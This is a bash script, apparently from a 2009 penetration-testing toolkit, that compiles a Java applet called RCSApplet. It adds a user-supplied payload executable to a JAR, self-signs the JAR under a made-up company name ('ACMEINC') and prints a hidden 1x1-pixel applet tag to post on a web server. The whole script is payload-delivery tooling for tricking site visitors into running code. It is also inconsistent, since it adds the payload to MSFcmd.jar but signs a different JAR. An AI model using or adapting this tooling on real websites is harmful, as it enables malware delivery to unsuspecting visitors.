#!/bin/bash
#   
#   Shell script to sign a Java Applet   
#   Joshua "Jabra" Abraham  <jabra@spl0it.org>
#   Tue Jun 30 02:26:36 EDT 2009
#
#   1. Compile the Applet source code to an executable class. 
#
#       javac HelloWorld.java
#
#   2. Package the compiled class into a JAR file.
#
#       jar cvf HelloWorld.jar HelloWorld.class
#
#   3. Generate key pairs. 
#
#       keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass mystorepass
#
#   4. Sign the JAR file. 
#
#       jarsigner -keystore mykeystore -storepass mystorepass -keypass mykeypass -signedjar  SignedHelloWorld.jar HelloWorld.jar signapplet
#
#   5. Export the public key certificate. 
#
#       keytool -export -keystore mykeystore -storepass mystorepass -alias signapplet -file mycertificate.cer
#
#   6. Deploy the JAR and the class file. 
#
#       <applet code=HelloWorld.class archive="SignedHelloWorld.jar" width=1 height=1> </applet>
#

NAME="RCSApplet"

# check arguments
if [ $# -ne 1 ] ; then
	echo "Usage: `basename $0` <payload>"
	exit 1
fi

PAYLOAD=$1

echo "[+] Using payload: $PAYLOAD"

javac $NAME.java
if [ $? -eq 1 ] ; then
    echo "Error with javac"
    exit
fi

echo "[+] Packaging the compiled class into a JAR file"
jar cf $NAME.jar $NAME.class
if [ $? -eq 1 ] ; then
    echo "Error with jar"
    exit
fi

echo "[+] Adding payload ($PAYLOAD) to JAR file"
zip -u MSFcmd.jar "$PAYLOAD.exe"
zip -u MSFcmd.jar "$PAYLOAD"
if [ $? -eq 1 ] ; then
    echo "Error with zip"
    exit
fi

if [ -f mykeystore ] ; then
	rm mykeystore
fi

echo "[+] Generating key pairs"
keytool -genkey -alias signapplet -dname "CN=ACMEINC, O=Default, C=US" -validity 18250 -keystore mykeystore -keypass mykeypass -storepass mystorepass
if [ $? -eq 1 ] ; then
    echo "Error with generating the key pair"
    exit
fi

echo "[+] Signing the JAR file"
jarsigner -keystore mykeystore -storepass mystorepass -keypass mykeypass -signedjar  "Signed$NAME.jar" $NAME.jar signapplet
if [ $? -eq 1 ] ; then
    echo "Error with signing the jar"
    exit
fi

echo "[+] Exporting the public key certificate"
keytool -export -keystore mykeystore -storepass mystorepass -alias signapplet -file mycertificate.cer
if [ $? -eq 1 ] ; then
    echo "Error with exporting the public key"
    exit
fi

echo "[+] Done"
sleep 1
echo ""
echo ""
echo "Deploy the JAR and certificate files. They should be deployed to a distribution directory on a Web server. "
echo ""
echo "<applet width='1' height='1' code=$NAME.class archive="Signed$NAME.jar"> </applet>" 
echo ""

